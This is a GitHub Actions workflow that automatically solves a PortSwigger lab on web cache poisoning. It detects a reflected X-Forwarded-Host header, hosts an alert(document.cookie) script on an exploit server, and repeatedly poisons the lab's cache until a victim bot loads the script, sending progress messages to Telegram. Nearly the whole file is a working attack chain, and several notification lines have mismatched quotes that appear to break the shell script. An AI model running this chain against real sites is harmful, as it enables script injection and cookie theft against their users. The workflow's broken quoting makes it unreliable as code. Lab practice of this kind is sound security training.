name: Auto-Solve PS Cache Poisoning

on:
  workflow_dispatch:
    inputs:
      lab_url:
        description: 'Paste FULL Lab URL (e.g., https://0ac4...web-security-academy.net/)'
        required: true
        type: string

jobs:
  auto-solver:
    runs-on: ubuntu-latest
    env:
      TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
      TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
    
    steps:
      - name: Install Dependencies
        run: |
          sudo apt-get update > /dev/null 2>&1 && sudo apt-get install -y jq curl > /dev/null 2>&1

      - name: Execute Full Attack Chain
        env:
          LAB_URL: ${{ github.event.inputs.lab_url }}
        run: |
          # Ensure URL ends with /
          LAB_URL="${LAB_URL%/}/"
          
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text=🚀 Auto-Solver Starting for: ${LAB_URL}" || true

          # ---------------------------------------------------------
          # STEP 1: Extract Exploit Server URL from Lab Page
          # ---------------------------------------------------------
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text=[1/5] Extracting Exploit Server URL..." || true
            
          LAB_HTML=$(curl -s "$LAB_URL")
          EXPLOIT_SERVER=$(echo "$LAB_HTML" | grep -oE 'https://exploit-[a-f0-9]+\.exploit-server\.net' | head -n 1)
          
          if [ -z "$EXPLOIT_SERVER" ]; then
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
              -d chat_id="${TELEGRAM_CHAT_ID}" \
              --data-urlencode "text=❌ ERROR: Could not find exploit server. Is the lab URL correct?" || true
            exit 1
          fi
          
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text=✅ Found Exploit Server: ${EXPLOIT_SERVER}" || true

          # ---------------------------------------------------------
          # STEP 2: Detect Unkeyed Header & Reflected Path
          # ---------------------------------------------------------
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text="[2/5] Probing for X-Forwarded-Host reflection..." || true
            
          CANARY="canary-test.com"
          # Bypass cache to hit backend
          PROBE_RESPONSE=$(curl -s "${LAB_URL}?cb=$(date +%s)" -H "X-Forwarded-Host: ${CANARY}")
          
          # Extract the path that was reflected (e.g., /resources/js/tracking.js)
          REFLECTED_PATH=$(echo "$PROBE_RESPONSE" | grep -oE "https://${CANARY}[^\s'\"<>]+" | sed "s|https://${CANARY}||" | head -n 1)
          
          if [ -z "$REFLECTED_PATH" ]; then
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
              -d chat_id="${TELEGRAM_CHAT_ID}" \
              --data-urlencode "text=❌ ERROR: X-Forwarded-Host is not reflected." || true
            exit 1
          fi
          
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text="✅ Reflected Path Found: ${REFLECTED_PATH}" || true

          # ---------------------------------------------------------
          # STEP 3: Upload Payload to Exploit Server
          # ---------------------------------------------------------
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text="[3/5] Uploading alert(document.cookie) to Exploit Server..." || true
            
          PAYLOAD="alert(document.cookie)"
          
          # Interact with PortSwigger Exploit Server API to host the file
          curl -s -X POST "$EXPLOIT_SERVER/" \
            -d "url=${REFLECTED_PATH}" \
            -d "responseBody=${PAYLOAD}" \
            -d "responseHeaders=Content-Type: text/javascript" \
            -d "responseType=200" > /dev/null
          
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text="✅ Exploit Server configured." || true

          # ---------------------------------------------------------
          # STEP 4: Poison the Cache
          # ---------------------------------------------------------
          # Extract just the hostname (e.g., exploit-xxx.exploit-server.net)
          EXPLOIT_HOST=$(echo "$EXPLOIT_SERVER" | awk -F/ '{print $3}')
          
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text="[4/5] Poisoning the cache with ${EXPLOIT_HOST}..." || true
            
          # Send the actual poisoning request
          curl -s -o /dev/null "$LAB_URL" -H "X-Forwarded-Host: ${EXPLOIT_HOST}"

          # ---------------------------------------------------------
          # STEP 5: Monitor Victim & Verify
          # ---------------------------------------------------------
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            --data-urlencode "text="[5/5] Waiting for victim bot to execute payload... (Cache expires every 30s, re-poisoning automatically)" || true
            
          SOLVED=0
          for i in {1..40}; do
            sleep 2
            
            # Check exploit server logs to see if the victim fetched the JS file
            LOGS=$(curl -s "$EXPLOIT_SERVER/log")
            
            if echo "$LOGS" | grep -q "${REFLECTED_PATH}"; then
              SOLVED=1
              break
            fi
            
            # Re-poison every 10 seconds to ensure cache stays poisoned until victim visits
            if (( i % 5 == 0 )); then
              curl -s -o /dev/null "$LAB_URL" -H "X-Forwarded-Host: ${EXPLOIT_HOST}"
            fi
          done
          
          if [ "$SOLVED" -eq 1 ]; then
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
              -d chat_id="${TELEGRAM_CHAT_ID}" \
              --data-urlencode "text="🎉🎉🎉 LAB SOLVED! 🎉🎉🎉\n\nThe victim bot fetched the poisoned JS file and executed alert(document.cookie)." || true
          else
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
              -d chat_id="${TELEGRAM_CHAT_ID}" \
              --data-urlencode "text="⏱️ Timed out waiting for victim. The cache might have been poisoned, but the bot didn't visit within the time limit." || true
          fi
